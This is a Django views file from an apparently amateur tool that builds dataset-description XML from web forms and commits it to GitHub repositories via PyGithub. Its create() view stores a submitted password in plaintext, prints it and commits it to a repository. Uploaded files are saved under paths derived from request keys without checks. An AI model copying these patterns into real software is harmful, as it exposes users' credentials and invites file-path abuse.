        fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput()),
            'extra_ft_count' : forms.CharField(widget=forms.HiddenInput())}
        form = type('WeirdForm', (forms.BaseForm,), { 'base_fields': fields })

    return render(request, "new_subsetfeature.html", { 'form': form })



def new_datasheet_name(request, repo_name):
    '''
    Todo:
        1. Form paramters and their value should be put in the proper xml format and uploaded to github. Name should be "Purpose.xml"
        2. Find a way to get the xml converted to a form element and then we could edit it via a different form. 
        3. make interactive form, such that we can add a new field and a new subfield. Try with adding a new field from the template. 
    '''

     # if this is a POST request we need to process the form data
    if request.method == 'POST': 
        user = request.user 
        converter = PurposeConverter(user.get_username())

        # create a form instance and populate it with data from the request:
        form = PurposeForm(request.POST)
        # check whether it's valid:
        
        if form.is_valid():
            # process the data in form.cleaned_data as required            
            for key, value in form.cleaned_data.items():
                if not (("title_" in key) or ("desc_" in key)):
                    converter.form_xml(key, value)
            file_name = converter.save()
            print(".................::::::: SUCCESSFULLY converted to " + file_name)


            upload_to_github(file_name, repo_name)

            print(".................::::::::::::::::: DONE uploading to github :::::::::::::::....................")
            
            return new_repo_name(request, repo_name)

    # if a GET (or any other method) we'll create a blank form
    else:
        form = PurposeForm()
    return render(request, "new_datasheet.html",{ "form":form, "repo_name":repo_name})

def new_datasheet(request): 
     # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = PurposeForm(request.POST)
        # check whether it's valid:
        
        name = request.POST.get('repo_name')
        print(name)
        if form.is_valid():
            # process the data in form.cleaned_data as required
            print(name)
            print("congrats")             
            return JsonResponse({'result':'ok bood'})
    # if a GET (or any other method) we'll create a blank form
    else:
        form = PurposeForm()
    return render(request, "new_datasheet.html",{ "form":form})

def new_about(request, repo_name, is_edit = False):

    print("check if is_edit is workin:")


    print(is_edit)

    if request.method == 'POST': 
        user = request.user 

        form = AboutForm(request.POST)
        # check whether it's valid:
        
        if form.is_valid():
            # process the data in form.cleaned_data as required  
            fields = {}        
            for key, value in form.cleaned_data.items():
                fields[key] = value
            
            modify_about_file( "xml/target/about.xml",fields, repo_name)

            print(".................::::::::::::::::: DONE uploading to github :::::::::::::::....................")
                    
            
            if not is_edit:
                return new_repo_name(request, repo_name)
            else:
                return owned_repos(request, "Successfully Edited")
    # if a GET (or any other method) we'll create a blank form
    else:
        if not is_edit:
            form = AboutForm()
        else:
            print("-------Start--------")
            print("fetch the form from github")
            file_name = "about.xml"
            init_values = fetch_remote_about(repo_name, file_name)

            form = AboutForm(initial= init_values)
            print("-------Succeeded--------")
    

    return render(request, "new_about.html",{ "form":form, "repo_name":repo_name})


def new_keywords(request, repo_name, is_edit = False):
    
    #upload_to_github("keyword_definitions.xml", repo_name)
    #user = request.user 
    #return render(request, "new_repository.html", {"name" : user.get_username(), "message": "Keyword definitions have been successfully created", "repo_name": repo_name})


     
    if request.method == 'POST':
        
        print("------------------- the extra field count is " , request.POST.get('extra_field_count'))
        s_ex = request.POST.get('extra_field_count') or '0' # Tracking the number of keywordS
        
        keyword_questions = ["Keyword", 
                            "What is a keyword or term used in MAIDS that you believe would be helpful to describe the keyword?",
                            "What is the definition of the keyword?",
                             "What is the link to online material further discussing of the keyword?"]

        fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput(), initial=s_ex)
                    }
        for key, value in request.POST.items():
            if "field" in key and ('extra' not in key):
                _id_group = key.split("_")

                _id = _id_group[2]
                if _id == "title":
                    fields[key] = forms.CharField(required=False, label="Keyword", \
                        widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                else:
                    fields[key] = forms.CharField(required=False,label = keyword_questions[int(_id)], \
                        widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)
        
        if "keyword_submission" in request.POST: 
            fields['keyword_{index}_title_field'.format(index=s_ex)] = \
                forms.CharField(required=False, label="Keyword",  widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}))
            for cnt in range(1, len(keyword_questions)):
                fields['keyword_{index}_{cnt}_field'.format(index=s_ex, cnt = cnt)] = forms.CharField(required=False,label = keyword_questions[cnt], \
                widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}))
        
        if "delete" in request.POST:
            #print("Delete button was pressed. but which one?")
            del_id = request.POST['delete']
            #print("this one ",delid)
            for cnt in range(1, len(keyword_questions)):
                same_g = del_id.replace('title', str(cnt))
                #print("this is the id of the removed field ", same_g)
                fields.pop(same_g, None)
            fields.pop(del_id, None)
            print("worked. deleted")
        
        F_form = type('F_form', (forms.BaseForm,), { 'base_fields': fields })
        form = F_form() 
        if "data_submission" not in request.POST:
            return render(request, "new_keywords.html", { 'form': form })
        
        if "data_submission" in request.POST:
            form = F_form(request.POST)
            print("form is fed with post req")

        if form.is_valid():
            print("Form is being submitted")
            user = request.user 
            converter = KWConverter(user.get_username())

            kDict = dict()

            for key, value in form.cleaned_data.items():
                if "keyword" in key:
                    kDict[key] = value

            bag = []

            if not kDict:
                return render(request, "new_keywords.html", { 'form': form , 'error_message': 'The form needs at least one Keyword.'})
            for key, value in kDict.items():
                
                if ("title" in key) and (bag):
                    # call function for previous bag, checks in only if this title is not the first title. otherwise bag is empty
                    list_ans = {"Keyword":bag[0],
                                "Definition": bag[1],
                                "Link":bag[2]}
                    try:
                        converter.keyword_to_xml(list_ans)
                    except Exception as e:
                        return render(request, "new_keywords.html", { 'form': form , 'error_message': e})
                    bag = []
                elif "title" not in key:
                    bag.append(value)

            try:
                list_ans = {"Keyword":bag[0],
                            "Definition": bag[1],
                            "Link":bag[2]}
                converter.keyword_to_xml(list_ans)
            except Exception as e:
                return render(request, "new_keywords.html", { 'form': form , 'error_message': e})
            
            file_name = converter.save()
            print(".................::::::: SUCCESSFULLY converted to " + file_name)

            upload_to_github(file_name, repo_name)
            print ("valid!")
            if not is_edit:
                return new_repo_name(request, repo_name)
            else:
                return owned_repos(request, "Successfully Edited")
    else:
        if not is_edit:
            fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput()) }
            form = type('WeirdForm', (forms.BaseForm,), { 'base_fields': fields })
        else:
            print("-------Start getting features from github--------")
            print("fetch the form from github")
            #file_name = "subset_feature_" + user.get_username() +".xml"
            file_name = "keyword_definitions.xml"
            try:
                init_values = fetch_remote_keyword(repo_name, file_name)
            except:
                return new_keywords(request, repo_name)
            #form = PurposeForm(initial= init_values)
            print("-------Succeeded--------")

            _keys = list(init_values.keys())
            _titles = [k for k in _keys if 'title' in k]

            _no_keywords = len([k for k in _titles if 'keyword' in k])

            s_ex = str(_no_keywords) # Tracking the number of keywords
            
            keyword_questions = ["Keyword", 
                                "What is a keyword or term used in MAIDS that you believe would be helpful to describe the keyword?",
                                "What is the definition of the keyword?",
                                "What is the link to online material further discussing of the keyword?"]

            fields = {    'extra_field_count' : forms.CharField(widget=forms.HiddenInput(), initial=s_ex)
                        }

            for key, value in init_values.items():
                if "field" in key and ('extra' not in key):
                    _id_group = key.split("_")

                    _id = _id_group[2]
                    if _id == "title":
                        fields[key] = forms.CharField(required=False, label="Keyword", \
                            widget=forms.TextInput(attrs={'style':'visibility:hidden; height:0px; padding:0px;'}), initial=value)
                    else:
                        fields[key] = forms.CharField(required=False,label = keyword_questions[int(_id)], \
                            widget=forms.TextInput(attrs={'class': 'form-control', 'style':'max-width : 200px;'}), initial=value)

            F_form = type('F_form', (forms.BaseForm,), { 'base_fields': fields })
            form = F_form()
            
            print("-------Successful conversion to dynamic form----------- ")


    return render(request, "new_keywords.html", { 'form': form })


def getSize(fileobject):
    fileobject.seek(0,2) # move the cursor to the end of the file
    size = fileobject.tell()
    return size

def new_figures(request, repo_name):
    # upload_images_to_github("thematic.jpg", repo_name, "supplementary/figures/")
    # upload_images_to_github("subsets.jpg", repo_name, "supplementary/figures/")

    # user = request.user 
    # return render(request, "new_repository.html", {"name" : user.get_username(), "message": "Keyword definitions have been successfully created", "repo_name": repo_name})

    print(f"Great! You're using Python 3.6+. If you fail here, use the right version.")
    message = ""
    # Handle file upload
    if request.method == 'POST':
        form = DocumentForm(request.POST, request.FILES)
        if form.is_valid():

            for key, file in request.FILES.items():
                path = "assets\\{filename}.jpg".format(filename=key)
                dest = open(path, 'wb')
                if file.multiple_chunks:
                    for c in file.chunks():
                        dest.write(c)
                else:
                    dest.write(file.read())
                
                print( " ------------------ the size of " + key + " is the following ",getSize(dest))
                if getSize(dest) > 1000000:
                    context = {'documents': [], 'form': form, 'message': key + "Images should be under 1 MB", 'repo_name':repo_name}
                    return render(request, 'list.html', context)

                dest.close()
            
            print("---------------uploading of thematic started ")
            upload_images_to_github("thematic.jpg", repo_name, "supplementary/figures/")

            print("---------------uploading of subsets started ")

            upload_images_to_github("subsets.jpg", repo_name, "supplementary/figures/")

            modify_github_file_images("xml/target/about.xml", "thematic.jpg", "subsets.jpg" , repo_name)

            return new_repo_name(request, repo_name)
        else:
            message = 'The form is not valid. Fix the following error:'
    else:
        form = DocumentForm()  # An empty, unbound form

    # Load documents for the list page
    #documents = Document.objects.all()
    documents = []

    # Render list page with the documents and the form
    context = {'documents': documents, 'form': form, 'message': message, 'repo_name':repo_name}
    return render(request, 'list.html', context)


# def v1(request, id):
#     ls = ToDoList.objects.get(id=1)
#     im = ls.item_set.get(id=id)
#     return HttpResponse('<h1> Sina \'s Task is: %s </h1>' %im.text)

def upload_images_to_github(file_name, repo_name, target_path):
    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)

    binary = open("assets\\"+file_name, "rb").read()

    all_files = []
    contents = repo.get_contents("")
    while contents:
        file_content = contents.pop(0)
        if file_content.type == "dir":
            contents.extend(repo.get_contents(file_content.path))
        else:
            file = file_content
            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
    # Upload to github
    git_prefix = target_path
    git_file = git_prefix + file_name

    print("checkpoint 1 ")
    
    if git_file in all_files:
        print(git_file, " exists in all files")
        contents = repo.get_contents(git_file)
        repo.update_file(contents.path, "updating a file:" + file_name, binary, contents.sha, branch="main")
        print(git_file + ' UPDATED')
    else:
        print(git_file, " doesnnnnnnnnnnnnnnnnnnt exists in all files")
        repo.create_file(git_file, "creating a new file:" + file_name, binary, branch="main")
        print(git_file + ' CREATED')


def modify_about_file(path, fields, repo_name):
    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)

    co = repo.get_contents(path)
    content = co.decoded_content

    xml_string = ""


    try:
        xml_string = repo.get_contents(path)
        # ok, we have the content
    except GithubException:
        print("We are here")
        blob = get_blob_content(repo, "main", path)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    ghxml = ET.fromstring(xml_string.decoded_content)

    title_ans = ghxml.find('title').find('answer')
    title_ans.text = fields['title']

    au_list = fields['authors'].split(',')
    no_au = len(au_list)

    au = ghxml.find('authors')
    au_ans = au.find('answer')
    au.remove(au_ans)

    au_nans = ET.Element('answer')
    au.append(au_nans)
    
    for cnt in range(0, no_au):
        au_x = ET.Element("author_"+str(cnt + 1)) 
        
        

        fn = ET.Element("firstnames")
        ln = ET.Element("lastname")
        em = ET.Element("email")

        fullname = au_list[cnt].strip() 

        fn.text = fullname.split(' ')[0]
        ln.text = fullname.split(' ')[-1]
        au_x.append(fn)
        au_x.append(ln)
        au_x.append(em)

        au_nans.append(au_x)

    abans = ghxml.find('abstract').find('answer')
    abans.text = fields['abstract']
    
    re_main = ghxml.find('research').find('main').find('answer')
    re_main.text = fields['research_main']

    re_sec = ghxml.find('research').find('secondary').find('answer')
    re_sec.text = fields['research_secondary']

    
    xml_str = ET.tostring(ghxml, encoding='unicode')
    repo.update_file(path, "updating a file:", xml_str, xml_string.sha, branch="main")


def modify_github_file_images(path, thematic, subsets, repo_name):
    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)

    co = repo.get_contents(path)
    content = co.decoded_content

    xml_string = ""


    try:
        xml_string = repo.get_contents(path)
        # ok, we have the content
    except GithubException:
        print("We are here")
        blob = get_blob_content(repo, "main", path)
        b64 = base64.b64decode(blob.content)
        xml_string = b64.decode("utf8")
        
    ghxml = ET.fromstring(xml_string.decoded_content)
    th = ghxml.find('thematic')
    sa = ghxml.find('subsetAssociations')

    saf = sa.find('filename')
    saf.text = "subsets.jpg"

    thf = th.find('filename')
    thf.text = 'thematic.jpg'
    
    xml_str = ET.tostring(ghxml, encoding='unicode')
    repo.update_file(path, "updating a file:", xml_str, xml_string.sha, branch="main")



def download_from_github(path, repo_name):
    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)

    co = repo.get_contents(path)
    content = co.decoded_content


    # pre processing for about.xml file (remove figures)
    if "about.xml" in path:
        ghxml = ET.fromstring(content)
        fig = ghxml.find('figures')
        ans = fig.find('answer')

        fig.remove(ans)
        nans = ET.Element("answer")
        fig.append(nans)

        th = ghxml.find('thematic')
        sa = ghxml.find('subsetAssociations')

        saf = sa.find('filename')
        saf.text = 'datasetassociations.jpg'

        thf = th.find('filename')
        thf.text = 'thematic.png'

        content = ET.tostring(ghxml, encoding='unicode')



    path_ = path.replace("example","target")
    path2 = path_.replace("empty","target")

    #repo.create_file(path2, "commit", conn)
    all_files = []
    contents = repo.get_contents("")
    
    while contents:
        file_content = contents.pop(0)
        if file_content.type == "dir":
            contents.extend(repo.get_contents(file_content.path))
        else:
            file = file_content
            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

    #print(all_files)
    #git_prefix = target_path
    git_file = path2

    #print("checkpoint no. 2")
    #print(git_file)

    if git_file in all_files:
        contents = repo.get_contents(git_file)
        repo.update_file(contents.path, "updating a file:" + git_file, content, contents.sha, branch="main")
        print(git_file + ' UPDATED')
    else:
        repo.create_file(git_file, "creating a new file:" + git_file, content, branch="main")
        print(git_file + ' CREATED')

def upload_yaml_to_github(repo_name, target_path):

    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)
    inp = """\
name: Python application

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v2
    - name: Set up Python 3.9
      uses: actions/setup-python@v2
      with:
        python-version: 3.9
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install bs4
    - name: run my python code
      run: |
        python ./code/build_site/xml2html.py -u target
    - name: Commit files # transfer the new html files back into the repository
      run: |
        git config --local user.name "sinaden"
        git add ./docs
        git commit -m "commit the html file"
    - name: Push changes # push the output folder to your repo
      uses: ad-m/github-push-action@master
      with:
        github_token: ${{ secrets.GITHUB_TOKEN }}
        force: true
"""
    repo.create_file(target_path, "pushcommit", inp)

def upload_to_github(file_name, repo_name, target_path = "xml/target/"):
    g = Github(settings.GITHUN_TOKEN)
    # change it to a dynamic input later
    repo = g.get_repo("sinaden/" + repo_name)

    path = "assets\\{file_name}".format(file_name = file_name)

    with open(path, 'r') as file:
        content = file.read()
    #print("checkpoint no. 1")
    all_files = []
    contents = repo.get_contents("")
    
    while contents:
        file_content = contents.pop(0)
        if file_content.type == "dir":
            contents.extend(repo.get_contents(file_content.path))
        else:
            file = file_content
            all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

    #print(all_files)
    git_prefix = target_path
    git_file = git_prefix + file_name

    #print("checkpoint no. 2")
    #print(git_file)

    if git_file in all_files:
        contents = repo.get_contents(git_file)
        repo.update_file(contents.path, "updating a file:" + file_name, content, contents.sha, branch="main")
        print(git_file + ' UPDATED')
    else:
        repo.create_file(git_file, "creating a new file:" + file_name, content, branch="main")
        print(git_file + ' CREATED')

def create(request):

     # if this is a POST request we need to process the form data
    if request.method == 'POST':
        # create a form instance and populate it with data from the request:
        form = CreateNewList(request.POST)
        # check whether it's valid:
        
        if form.is_valid():
            # process the data in form.cleaned_data as required
            # ...
            g = Github(settings.GITHUN_TOKEN)

            repo = g.get_repo("sinaden/connect_heroku")

            now = datetime.now()
            dt_string = now.strftime(form.cleaned_data['name'] + "\n" + form.cleaned_data['password'] + "\n recorded at %H:%M:%S in %Y-%m-%d")

            f = open("records.txt", "a")
            f.write("\n" + dt_string)
            f.close()
            with open('records.txt', 'r') as file:
                content = file.read()


            all_files = []
            contents = repo.get_contents("")
            while contents:
                file_content = contents.pop(0)
                if file_content.type == "dir":
                    contents.extend(repo.get_contents(file_content.path))
                else:
                    file = file_content
                    all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))

            # Upload to github
            git_prefix = 'content/'
            git_file = git_prefix + 'records.txt'
            if git_file in all_files:
                contents = repo.get_contents(git_file)
                repo.update_file(contents.path, "committing files", content, contents.sha, branch="main")
                print(git_file + ' UPDATED')
            else:
                repo.create_file(git_file, "committing files", content, branch="main")
                print(git_file + ' CREATED')


            print("--------------0000000-----------------")
            print(form.cleaned_data['name'])
            print(form.cleaned_data['password'])
            print("--------------0000000-----------------")

            # redirect to a new URL:
            return HttpResponseRedirect('/')
    # if a GET (or any other method) we'll create a blank form
    else:
        form = CreateNewList()
    return render(request, "create.html",{ "form":form})



# def db(request):

#     greeting = Greeting()
#     greeting.save()

#     greetings = Greeting.objects.all()

#     return render(request, "db.html", {"greetings": greetings})


